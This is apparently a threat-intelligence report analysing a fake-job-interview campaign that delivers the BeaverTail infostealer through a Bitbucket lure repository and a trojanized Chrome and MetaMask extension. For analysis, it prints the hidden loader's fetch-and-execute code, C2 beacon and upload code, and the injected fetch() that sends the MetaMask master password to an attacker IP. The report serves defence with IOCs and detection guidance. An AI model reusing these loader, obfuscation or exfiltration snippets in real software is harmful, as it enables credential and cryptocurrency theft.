---
title: "Wallet Trap: BeaverTail and Trojanized MetaMask Delivered via Fake Dev Assignment"
date: 2026-03-24
author: "ThreatProphet"
description: "Analysis of a Contagious Interview campaign delivering BeaverTail via a Bitbucket lure repository, culminating in a trojanized MetaMask extension that silently exfiltrates the victim's wallet master password."
tags:
  - lazarus-group
  - contagious-interview
  - beavertail
  - metamask
  - javascript
  - linkedin-lure
  - jsonkeeper
  - node-js
  - crypto-stealer
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1027
  - T1105
  - T1059.007
  - T1555.003
  - T1056.002
  - T1567
report_id: "TP-2026-007"
showToc: true
---

> *"The rite began with promise and ended in defilement."*

## Executive Summary

A threat actor operating a fake recruiter persona on LinkedIn targeted developers with a bogus technical assignment. The lure repository (**mocorex**) was hosted on Bitbucket under the fabricated organisation **fortegroup-org**, impersonating a legitimate DeFi company. The project presented as a standard React/Vite web application, complete with plausible component structure and a commit history spanning multiple apparent contributors. Concealed within it was a heavily horizontally-indented loader, `public/vite.cookie.js`, designed to evade casual code review by pushing malicious content off-screen in any standard file viewer.

At runtime, the loader silently fetched a BeaverTail payload from **jsonkeeper.com/b/5SA4R**, a legitimate JSON storage service increasingly exploited by Contagious Interview operators as a staging host. The Stage 2 payload (`cookie` field, consistent with all documented BeaverTail variants) deployed a broad infostealer capability set: host fingerprinting, platform-specific VM detection, persistent clipboard monitoring targeting cryptocurrency wallet addresses, and direct harvesting of 50 hardcoded browser-based crypto wallet extensions across up to 100 Chrome profiles. On macOS, it escalated further into a multi-stage trojanisation chain.

The macOS chain replaced the victim's **Google Chrome** installation with a malicious build and injected a **pixel-perfect clone of MetaMask 13.16.0** as a sideloaded extension. This component added a targeted credential theft layer on top of the broader infostealer: a single `fetch()` call inserted into MetaMask's password submission handler silently exfiltrated the wallet master password in plaintext to operator infrastructure at `146.70.24.211:4553/api/dech_result` on every unlock attempt, with no visible indication to the victim. The master password decrypts the MetaMask vault, yielding the BIP-39 seed phrase and granting permanent, irrecoverable control over every wallet the victim holds. File exfiltration from harvested wallet and browser data was routed separately to a third C2 host at `184.174.97.8` across two ports, suggesting distinct backend processing pipelines for different data types.

Three distinct C2 IPs were extracted across the payload stages: `45.61.130.84` (beacon and logging), `146.70.24.211` (payload delivery and password exfiltration), and `184.174.97.8` (file exfiltration, ports 4556 and 4558). All three share a hardcoded campaign UID of `a3c65c2974270fd093ee8a9bf8ae7d0b`, enabling cross-victim correlation. Notably, `184.174.97.8` was not recoverable via string decoding alone; the IP was constructed entirely from numeric hex constants assembled at runtime, bypassing string-based static analysis. Infrastructure fingerprinting of `45.61.130.84` leaked a Windows Server path (`C:\Users\Administrator\Documents\script-server\`) consistent with previously documented Contagious Interview operator infrastructure patterns. TTPs are consistent with **Lazarus Group / Contagious Interview** as documented by NVISO, Microsoft, SANS, and others; attribution is assessed at **medium confidence** based on TTP similarity and infrastructure overlap with published campaigns.

---

## Attack Overview

### Initial Contact

I was approached on LinkedIn by a persona presenting as a recruiter for a Web3 company. The lure followed the now-standard Contagious Interview pattern: a multi-stage interview process concluding with a "technical assignment", in this case cloning and running the **mocorex** repository hosted on Bitbucket under the fabricated organisation account **fortegroup-org**. The project was presented as a frontend application requiring review and minor modification, a common framing chosen to justify running `npm install` locally.

The organisation name `fortegroup-org` does not correspond to any identifiable legitimate entity. The naming convention (a plausible corporate name combined with a `-org` suffix) is consistent with account pre-staging practices documented in prior Contagious Interview campaigns.

### Kill Chain

1. Victim is contacted on LinkedIn by a fake recruiter and directed to clone `bitbucket.org/fortegroup-org/mocorex`.
2. Running `npm install` or starting the development server causes the JavaScript runtime to load `public/vite.cookie.js`, a loader disguised as a Vite development utility.
3. The loader fetches obfuscated BeaverTail JavaScript from `jsonkeeper.com/b/5SA4R` (the `cookie` field) and executes it via `new Function('require', payload)(require)`.
4. BeaverTail beacons to `45.61.130.84/api/service/process/<uid>` with host profile data (OS, hostname, platform, user info) and a hardcoded campaign UID.
5. BeaverTail initiates clipboard monitoring (polling every 500ms) and exfiltrates any clipboard changes to `45.61.130.84/api/service/makelog`.
6. On macOS, BeaverTail downloads an XZ-compressed DMG from `146.70.24.211:4553/api/dd`, kills Google Chrome, renames `/Applications/Google Chrome.app` to `/Applications/tempapp`, and installs the trojanized Chrome in its place.
7. Concurrently, a ZIP archive is downloaded from `146.70.24.211:4553/api/dm` and extracted to `~/Library/Caches/com.apple.chromo`, a disguised path chosen to blend with legitimate Apple cache directories.
8. The trojanized Chrome loads the fake MetaMask extension from `com.apple.chromo` instead of the legitimate installed version.
9. The next time the victim unlocks MetaMask, their master password is silently exfiltrated via HTTP POST to `146.70.24.211:4553/api/dech_result`.

---

## Technical Analysis

### Stage 1: Loader (`public/vite.cookie.js`)

The malicious loader is placed in the `public/` directory of the Vite project, ensuring it is served as a static asset and excluded from typical server-side code review. The filename `vite.cookie.js` is chosen to mimic a legitimate Vite development plugin, a naming convention developers working with the framework would find unremarkable.

The file employs horizontal whitespace obfuscation: the malicious code begins after thousands of leading space characters on a single line, pushing it entirely off-screen in any standard file viewer or code editor without horizontal scroll. This technique has been consistently observed across Contagious Interview lure repositories on both GitHub and Bitbucket since at least 2024.

**Execution trigger: `vite.config.js`**

The loader is not self-executing. A separate commit (`275d524`, authored by `dnaleor@gmail.com`, 2026-03-02) introduced a `vite.config.js` that wires up execution with a single `require` call:

```javascript
// https://vitejs.dev/config/
module.exports = defineConfig(async ({ mode }) => {
  const plugins = [react()];
  // https://vitejs.dev/config/
  require('./public/vite.cookie');   // ← malicious execution trigger
  // Only load componentTagger in development mode using dynamic import
  if (mode === "development") {
    try {
      const { componentTagger } = await import("lovable-tagger");
      plugins.push(componentTagger());
    } catch (error) { ... }
  }
  ...
```

The call is placed at the top level of the config module outside any conditional block, so it executes unconditionally whenever Vite loads the config — on `npm run dev`, `npm run build`, or any other Vite command. It is sandwiched between two legitimate `// https://vitejs.dev/config/` comments, blending visually into standard boilerplate.

The presence of `lovable-tagger` — a real dependency used by the Lovable.dev AI project generator — indicates the lure repository was scaffolded using an AI code generation tool to produce a convincing codebase quickly, with the malicious `require` line then injected into the generated config.

**Payload fetch and execution**

At runtime, the loader fetches its payload from the JSONkeeper staging URL and executes it:

```javascript
// Reconstructed loader logic (simplified)
fetch("https://jsonkeeper.com/b/5SA4R")
  .then(r => r.json())
  .then(d => new Function('require', d.cookie)(require));
```

The `cookie` key name in the JSON response is a documented BeaverTail signature, consistent across all variants reported by NVISO (November 2025), Microsoft (March 2026), and independent researchers.

### Stage 2: BeaverTail Payload

The Stage 2 payload retrieved from `jsonkeeper.com/b/5SA4R` is a heavily obfuscated BeaverTail variant. Obfuscation is implemented via a custom multi-alphabet base-encoding scheme: a constant lookup table (`uQH0eUH`) replaces all numeric literals, and all string literals are stored in a single encoded array (`_94vf9`) decoded at runtime by one of six independent decoder functions, each using a distinct scrambled alphabet string. This per-block alphabet variation is a deliberate anti-signature technique introduced in the October 2025 BeaverTail update documented by Microsoft, designed to defeat YARA rules that rely on a fixed decoder pattern.

A self-nullifying no-op function (`vlQxR3`) overwrites itself on first call, preventing re-execution and complicating dynamic analysis. Multiple redundant `try/catch` blocks each embed an independent decoder instance, providing resilience against parse-time errors in sandboxed environments.

Static extraction of the decoded string array revealed the full capability set:

**Host profiling and beaconing:**

```javascript
// Victim registration beacon
axios.post("http://45.61.130.84/api/service/process/" + uid, {
  OS: os.type(),
  platform: os.platform(),
  release: os.release() + (isVM ? " (VM)" : "(Local)"),
  host: os.hostname(),
  userInfo: os.userInfo(),
  uid: uid,
  t: 1  // hardcoded campaign flag
});
```

The campaign UID `a3c65c2974270fd093ee8a9bf8ae7d0b` is hardcoded across all stages and sent with every outbound request, enabling the operator to correlate data from multiple victims on the same C2 panel.

**Anti-static-analysis: numeric constant IP assembly**

A third C2 IP (`184.174.97.8`) was not stored as a string anywhere in the payload and was therefore not recoverable by the string decoder alone. Instead, the IP was constructed entirely from hex integer constants and a separator character fetched from the `uQH0eUH` lookup table:

```javascript
// IP octets as hex integer constants
const qAe1Vp  = 0xb8;            // 184
const qUGwra  = 0xae;            // 174
const nwDAQSn = 0x61;            // 97
const cFpXnq  = uQH0eUH[0x2];   // 8  (from constant lookup table)

// Separator "." stored as uQH0eUH[0x12] in the constant table
const X9gtI3O = "" + qAe1Vp  + uQH0eUH[0x12]
                   + qUGwra  + uQH0eUH[0x12]
                   + nwDAQSn + uQH0eUH[0x12]
                   + cFpXnq;
// → "184.174.97.8"

// Ports as hex integer literals
const cY0l18Q = 0x11cc;  // 4556
const dely_ky = 0x11ce;  // 4558
```

The assembled variables (`X9gtI3O`, `cY0l18Q`, `dely_ky`) were then injected into the inner process spawn payloads at runtime, where they appeared as fully resolved strings only at the point of execution, invisible to any analysis that operates on encoded string arrays alone. This technique specifically defeats extractors that target the `_94vf9` string pool, and is consistent with the progressive hardening of BeaverTail's obfuscation documented in Microsoft's March 2026 report. The complete upload endpoint construction:

```javascript
// Process 2 and 3 spawn payload
const uu = "http://" + X9gtI3O + ":" + cY0l18Q + "/upload";
// → "http://184.174.97.8:4556/upload"

// Process 4 spawn payload  
const uu = "http://" + X9gtI3O + ":" + dely_ky + "/upload";
// → "http://184.174.97.8:4558/upload"
```

The two ports likely correspond to different exfiltration process branches, with harvested file uploads routed to separate receiver instances on the same host, possibly to separate victim queues on the operator's backend.

**VM detection:** Before proceeding, BeaverTail performs active environment checks across all three supported platforms:

| Platform | Method | Indicators Checked |
|---|---|---|
| Windows | `wmic computersystem get model,manufacturer` | `vmware`, `virtualbox`, `qemu`, `microsoft corporation` |
| macOS | `system_profiler SPHardwareDataType` | `/vmware\|virtualbox\|qemu\|parallels\|virtual/i` |
| Linux | `readFileSync('/proc/cpuinfo')` | `hypervisor`, `vmware`, `virtualbox`, `qemu`, `kvm`, `xen`, `parallels`, `bochs` |

If a VM is detected, the operator is notified via the `(VM)` suffix appended to the OS release string in the beacon, but execution continues. This is consistent with operator tradecraft that marks sandboxed victims for filtering without alerting them.

**Clipboard monitoring:** A `setInterval` loop polls the clipboard every 500ms using platform-native commands (`pbpaste` on macOS, `powershell Get-Clipboard` on Windows). Any change is debounced 500ms and exfiltrated to the makelog endpoint. This capability is specifically designed to intercept cryptocurrency wallet addresses copied for transaction signing.

**Wallet extension harvesting:** Fifty browser extension IDs are hardcoded, covering every major cryptocurrency wallet available as a Chrome extension. The payload iterates up to 100 Chrome user profiles, reads `Preferences` and `Secure Preferences` for each, enables developer mode (`extensions.ui.developer_mode = true`), and uses a deterministic machine ID to decrypt `Secure Preferences`, extracting encrypted vault data directly from the browser profile filesystem.

### Stage 3a: Trojanized Chrome (macOS)

On macOS, BeaverTail executes the following sequence after a 3-second initial delay:

1. Downloads XZ-compressed DMG from `146.70.24.211:4553/api/dd` to a temporary path.
2. Kills the running Google Chrome process via `killall -9 "Google Chrome"`.
3. Renames `/Applications/Google Chrome.app` to `/Applications/tempapp` (preserving the legitimate binary as cover).
4. Mounts the DMG via `hdiutil attach` and installs the contained `.app` bundle to `/Applications`, replacing Chrome.
5. Deletes the DMG.

The trojanized Chrome installs silently and appears identical to the legitimate application in all respects.

### Stage 3b: Trojanized MetaMask Extension

Concurrently, a ZIP archive downloaded from `146.70.24.211:4553/api/dm` is extracted to `~/Library/Caches/com.apple.chromo`. This archive contains a complete MetaMask 13.16.0 extension (1,446 files) with a single surgical modification. File timestamps reveal the operator's precise changes:

| Timestamp | Files | Nature |
|---|---|---|
| `2016-07-13 17:00` | All 1,400+ legitimate MetaMask files | Unmodified, taken directly from an official MetaMask build (npm pack epoch timestamp) |
| `2026-02-02 23:35/36` | `manifest.json`, all `_locales/*/messages.json` | Operator-modified localisation and manifest |
| `2026-02-18 04:43` | `ui-20.js` | **Malicious injection** |

The sole malicious modification is a single `fetch()` call injected into the `handleSubmit` method of `unlock-page.component.tsx`, executed before any legitimate unlock logic:

```javascript
// Injected code inside handleSubmit, module 8212 of ui-20.js
S(this, "handleSubmit", async e => {
  e.preventDefault();
  e.stopPropagation();
  const { password: t } = this.state;

  // Exfiltrate password before unlock
  fetch("http://146.70.24.211:4553/api/dech_result", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      data: t,                  // MetaMask master password, plaintext
      uid: navigator.platform,  // OS platform fingerprint
      pname: Date.now()         // timestamp
    })
  });

  // Legitimate MetaMask unlock logic continues normally...
```

The MetaMask UI behaves entirely normally after this call. The victim sees no error, no latency, and no visual indication that their password has been transmitted. The master password decrypts the MetaMask vault, yielding the BIP-39 seed phrase and granting the operator permanent, irrecoverable control over every wallet derived from it.

### C2 Infrastructure Fingerprint

Probing `45.61.130.84` on port 80 returned a 404 error page that leaked an Express.js server path:

```
Error: ENOENT: no such file or directory,
stat 'C:\Users\Administrator\Documents\script-server\client\build\index.html'
```

This confirms a Windows Server host running an Express.js application referred to internally as `script-server`, consistent with the web-based C2 panel architecture documented in prior Contagious Interview infrastructure analyses.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn fake recruiter lure |
| T1204.002 | Malicious File | Execution | `npm install` / dev server start triggers loader |
| T1027 | Obfuscated Files or Information | Defense Evasion | Horizontal whitespace in `vite.cookie.js`; multi-alphabet encoding in BeaverTail |
| T1105 | Ingress Tool Transfer | Command and Control | JSONkeeper fetch of Stage 2; C2 downloads of Stage 3 DMG and ZIP |
| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` RCE primitive |
| T1555.003 | Credentials from Web Browsers | Credential Access | MetaMask vault decryption via browser profile filesystem |
| T1056.002 | GUI Input Capture | Credential Access | Trojanized MetaMask intercepts master password at unlock |
| T1115 | Clipboard Data | Collection | 500ms clipboard polling via `pbpaste` / `powershell Get-Clipboard` |
| T1036.005 | Match Legitimate Name or Location | Defense Evasion | `public/vite.cookie.js`; `~/Library/Caches/com.apple.chromo` |
| T1567 | Exfiltration Over Web Service | Exfiltration | Password and clipboard data exfiltrated over plain HTTP |
| T1497.001 | Virtualization/Sandbox Evasion | Defense Evasion | Active VM detection across Windows, macOS, Linux |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `45.61.130.84` | IPv4 | C2 - victim registration and makelog beacon; Express.js; Windows Server |
| `146.70.24.211` | IPv4 | C2 - Stage 3 payload delivery and password exfiltration; port 4553 |
| `jsonkeeper.com/b/5SA4R` | URL | Stage 2 BeaverTail staging - JSONkeeper (new, undocumented endpoint) |
| `45.61.130.84/api/service/process/<uid>` | URL | Victim registration endpoint |
| `45.61.130.84/api/service/makelog` | URL | Logging/clipboard exfiltration endpoint |
| `146.70.24.211:4553/api/dd` | URL | Trojanized Chrome DMG download |
| `146.70.24.211:4553/api/dm` | URL | Trojanized MetaMask ZIP download |
| `146.70.24.211:4553/api/dech_result` | URL | MetaMask password exfiltration endpoint |
| `184.174.97.8` | IPv4 | C2 - file exfiltration server; ports 4556 and 4558; IP assembled from numeric constants at runtime |
| `184.174.97.8:4556/upload` | URL | File exfiltration - Process 2/3 branch |
| `184.174.97.8:4558/upload` | URL | File exfiltration - Process 4 branch |

### Repository Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket.org/fortegroup-org/mocorex` | Repository | Primary lure repository |
| `fortegroup-org` | Bitbucket account | Fabricated organisation |
| `public/vite.cookie.js` | File path | Stage 1 loader - horizontal whitespace obfuscation |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `45.61.130.84` | IPv4 | High |
| `146.70.24.211` | IPv4 | High |
| `184.174.97.8` | IPv4 | High - assembled from numeric constants; not recoverable via string decoding |
| `jsonkeeper[.]com/b/5SA4R` | URL | High |
| `a3c65c2974270fd093ee8a9bf8ae7d0b` | Campaign UID | High - hardcoded in all payload stages |

### File Indicators

| Hash (SHA256) | Filename | Notes |
|---|---|---|
| *(retrieve from manifest)* | `public/vite.cookie.js` | Stage 1 loader, mocorex HEAD |
| *(retrieve from manifest)* | `stage2-payload-raw.json` | BeaverTail, retrieved from JSONkeeper 2026-03-23 |
| *(retrieve from manifest)* | `stage3-dmg-*.bin` | Trojanized Chrome DMG (XZ), retrieved 2026-03-23 |
| *(retrieve from manifest)* | `stage3-dm-clean-*.bin` | Trojanized MetaMask ZIP, retrieved 2026-03-23 |
| *(retrieve from manifest)* | `stage3-metamask-ui20.js` | MetaMask `ui-20.js` with injected password exfil |
| *(retrieve from manifest)* | `stage3-metamask-manifest.json` | Trojanized extension manifest (MetaMask 13.16.0) |

### Host Indicators

| Indicator | Type | Notes |
|---|---|---|
| `~/Library/Caches/com.apple.chromo` | Directory | Trojanized MetaMask extraction path (macOS) |
| `/Applications/tempapp` | Path | Legitimate Chrome renamed here post-compromise (macOS) |
| Chrome extension `nkbihfbeogaeaoehlefnkodbefgpgknn` with modified `ui-20.js` | Extension | Trojanized MetaMask; confirms if SHA256 of `ui-20.js` does not match official MetaMask 13.16.0 release |

### Repository Indicators

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket.org/fortegroup-org/mocorex` | Repository | Malicious lure repository |
| `275d524228cda97eca2601361d2142364fa1f3ce` | Commit | `vite.config.js` execution trigger, authored `dnaleor@gmail.com`, 2026-03-02 |
| `55da152f17b57b88efe566f62963988db959f59e` | Commit | `vite.cookie.js` "Complete implementation", authored `dnaleor@gmail.com`, 2026-02-08 |
| `dnaleor@gmail.com` | Git author | Operator identity - authored both the loader and its execution trigger |
| Horizontal whitespace before payload in JS file | Code pattern | Contagious Interview obfuscation signature |
| JSONkeeper `cookie` field execution | Code pattern | Documented BeaverTail delivery mechanism |
| `require('./public/vite.cookie')` in `vite.config.js` | Code pattern | Unconditional execution trigger on any Vite command |
| `new Function('require', payload)(require)` | Code pattern | Persistent BeaverTail execution primitive |

---

## Attribution Assessment

**Assessed confidence: Medium**

This campaign presents a dense cluster of TTPs consistent with documented Lazarus Group / Contagious Interview activity:

- LinkedIn-based recruitment lure targeting developers - the defining characteristic of Contagious Interview since its first documentation by Palo Alto Unit42 in November 2023.
- Bitbucket-hosted lure repository - Bitbucket has been a documented Contagious Interview delivery platform since early 2025, with dozens of reported takedowns in the Atlassian Community forums.
- JSONkeeper as a payload staging host - NVISO documented this specific technique (JSONkeeper, JSONsilo, npoint.io as BeaverTail staging hosts) in November 2025, and it remains an active operator preference at time of writing.
- `cookie` field in the JSON response containing the BeaverTail payload - this is a consistent, documented BeaverTail signature across all reported variants.
- Multi-alphabet base-encoding obfuscation - matches the October 2025 BeaverTail update noted in Microsoft's March 2026 report, which introduced heavier obfuscation to hinder static analysis.
- Hardcoded campaign UID across all stages - consistent with documented BeaverTail operator infrastructure management patterns.
- Crypto wallet credential theft as the terminal objective - consistent with Lazarus Group's known financial motivation and focus on cryptocurrency targets.

The trojanized MetaMask component represents an escalation from previously documented BeaverTail campaigns, which typically targeted wallet files on disk. Replacing the browser binary to intercept the master password at the point of entry is a more capable and more persistent technique. It is unclear at this time whether this component is novel to this campaign or has been observed elsewhere without public disclosure.

Attribution should not be asserted beyond TTP similarity without additional corroborating intelligence.

**Prior reporting:**
- [NVISO - Contagious Interview Actors Now Utilize JSON Storage Services](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/)
- [Microsoft - Contagious Interview: Malware Delivered Through Fake Developer Job Interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [SANS CTI Summit 2026 - Hunting North Korea's Contagious Interview Operation](https://www.sans.org/presentations/hunting-north-koreas-state-sponsored-contagious-interview-operation-attacks-on-developers-via-the-software-supply-chain)
- [MITRE ATT&CK - Contagious Interview (G1052)](https://attack.mitre.org/groups/G1052/)

---

## Remediation

### If You Ran the Repository

- **Isolate the machine immediately.** Disconnect from all networks before taking any further action.
- **Preserve forensic evidence.** Memory dump, shell history (`.bash_history`, `.zsh_history`), system logs, and the `~/Library/Caches/com.apple.chromo` directory before remediation.
- **Check for Chrome replacement.** Verify whether `/Applications/tempapp` exists. If it does, your Chrome has been replaced. Do not open the trojanized installation further.
- **Assume your MetaMask master password is compromised.** If you have ever unlocked MetaMask since running the repository, treat the password as known to the attacker.
- **Assume your seed phrase is compromised.** Transfer all assets to wallets generated on a clean, air-gapped machine using a freshly generated seed phrase immediately. Do not reuse any wallet derived from a seed stored in the compromised MetaMask instance.
- **Rotate all credentials.** SSH keys, API tokens, cloud credentials, and all browser-stored passwords accessible from the machine.
- **Audit for persistence.** Check `~/Library/LaunchAgents/`, `~/Library/LaunchDaemons/`, cron jobs, and login items for entries created at or after the time of repository execution.
- **Do not rely on AV/EDR alone.** The payload executes as JavaScript within a legitimate Node.js process and the trojanized Chrome is a signed-looking macOS application. Standard endpoint tools are unlikely to flag either.
- **Reimage.** If compromise is confirmed, restore from a known-good backup predating repository execution, or perform a clean OS install.

### Network-Level Detection

- Block and alert on all outbound connections to `45.61.130.84`, `146.70.24.211`, and `184.174.97.8` (all ports).
- Alert on outbound HTTP (not HTTPS) POST requests from browser processes to non-standard ports, particularly port 4553.
- Alert on HTTP POST requests containing JSON bodies with a `data` field originating from Chrome or Chromium processes to any external IP on a non-standard port.
- Monitor for outbound connections to `jsonkeeper.com` from Node.js processes on developer workstations; legitimate use is rare and any such connection should be investigated.
- Create IDS signatures for HTTP requests to `/api/service/makelog`, `/api/service/process/`, `/api/dech_result`, and `/upload` on ports 4556 and 4558.

### Host-Level Detection and Hardening

- Check for the presence of `/Applications/tempapp` and `~/Library/Caches/com.apple.chromo`; either indicates active compromise.
- Verify the SHA256 of `~/Library/Application Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/` against the official MetaMask release for your installed version. Any mismatch indicates a trojanized extension.
- Monitor filesystem events for writes to `~/Library/Caches/com.apple.chromo` and renames of `/Applications/Google Chrome.app`.
- Run developer assessments from unknown sources exclusively in an isolated VM or container with restricted network egress and ephemeral storage. Running `npm install` in an untrusted repository must never be treated as a safe operation.
- Audit all `public/` directory JavaScript files in Vite/React projects for horizontal whitespace anomalies before execution. Malicious code pushed off-screen is invisible without explicit horizontal scroll inspection.

---

## Appendix: Evidence Artifacts

| SHA256 | Description |
|---|---|
| `3538dca5a5eeb50d26b9ee7c6ad0ea5a63af4fe49b7c9aa242a7b06dce34501d` | `public/vite.cookie.js` - Stage 1 loader, mocorex HEAD |
| `52b3f9eeda915ff2e64687f31c2b095dd83e95d19097de619ff956a1e8a5419c` | `vite.config.js` - execution trigger containing `require('./public/vite.cookie')` |
| `3dd949a7a16db7d6f1a677f6c8abeeca2695e4e95cb6174b69b0e71dcf570bbc` | Stage 2 payload capture (full headers) - BeaverTail retrieved from `jsonkeeper.com/b/5SA4R`, 2026-03-23 |
| `0ca3a74ac972080a2f7a915044abd81d95338afde17aeae26af6f7a31c16e3ec` | Stage 2 payload capture (second probe) - `jsonkeeper.com/b/5SA4R`, 2026-03-23 |
| `5f69913d6292ae9b879536ab8c08c9938ffbed352733ae7896f06d4ab09208cc` | Stage 2 payload body - BeaverTail (`stage2-payload-raw.json`) |
| `9ff923e481be7714f19a8aad6b4b988fb6370b0e14db131e1c27a47c620446bb` | Stage 3 DMG (XZ) - trojanized Chrome, retrieved from `146.70.24.211:4553/api/dd`, 2026-03-23 |
| `d552a58a137c0ca1d95f70c6f07a2cbce0d8c0a60bd5ec37d4bad7c97b6bf99a` | Stage 3 ZIP - trojanized MetaMask 13.16.0, retrieved from `146.70.24.211:4553/api/dm`, 2026-03-23 |
| `116fa81f492cc851c66fb0bbf4b69165c0d6ddaa163c57c039221761bcefd392` | MetaMask `manifest.json` - extracted from Stage 3 ZIP |
| `a4fb63bdb311b6cecb1f572310f1cc8c30cb85aa8d3ed5a164ec2d39a55c6e9a` | MetaMask `ui-20.js` - contains injected password exfiltration code |
| `3caed7372c3799e2aad5b207f8dc085b08ec90095ca37cce34a2bb36e6f73bd6` | C2 probe response - `45.61.130.84/api/service/makelog`, 2026-03-23 |
| `c4f20ff26e2c9f7c9460943ed7cedd5df6a0cc0d34a097ffd146f1513e810eb4` | C2 probe response - `146.70.24.211:4553/api/dech_result`, 2026-03-24 |
| `9bfb1976ecba683c930f68e10216a26f7c4684896b9a66f6201a2ac67f2c28ac` | Git commit log with author metadata (full history) |
| `45cb10ac5413a50b8920841ffb79d9b1572d7a81af181834e7ca3fa1b118887a` | Full diff of commit `275d524` - `vite.config.js` execution trigger |

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-007 | Published: 2026-03-24 | Author: [ThreatProphet](https://threatprophet.com)*
